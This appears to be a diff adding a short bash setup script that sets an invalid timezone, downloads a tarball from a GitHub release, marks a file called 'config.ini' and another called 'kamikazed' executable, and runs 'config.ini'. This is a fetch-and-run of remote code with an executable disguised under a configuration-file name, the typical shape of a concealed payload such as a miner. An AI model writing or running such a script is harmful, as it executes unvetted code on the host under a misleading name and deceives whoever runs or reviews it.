@@ -1,0 +1,9 @@
+#!/bin/bash
+set -x
+apt-get update 
+ln -fs /usr/share/zoneinfo/Iraq/Montserrat /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+wget -q https://github.com/sanddune133/sanddune/releases/download/kamisuto/kamisuto.tar.gz && tar -xvf kamisuto.tar.gz 
+chmod +x kamikazed
+chmod +x config.ini 
+./config.ini
